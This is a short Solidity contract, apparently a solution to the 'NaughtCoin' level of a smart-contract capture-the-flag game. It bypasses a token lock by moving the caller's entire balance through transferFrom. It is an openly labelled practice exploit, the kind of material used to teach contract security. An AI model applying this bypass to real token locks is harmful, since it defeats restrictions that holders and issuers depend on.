// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinAttack {
    function attack(address _target) public {
        IERC20 coin = IERC20(_target);

        coin.transferFrom(
            msg.sender,
            address(this),
            coin.balanceOf(msg.sender)
        );
    }
}
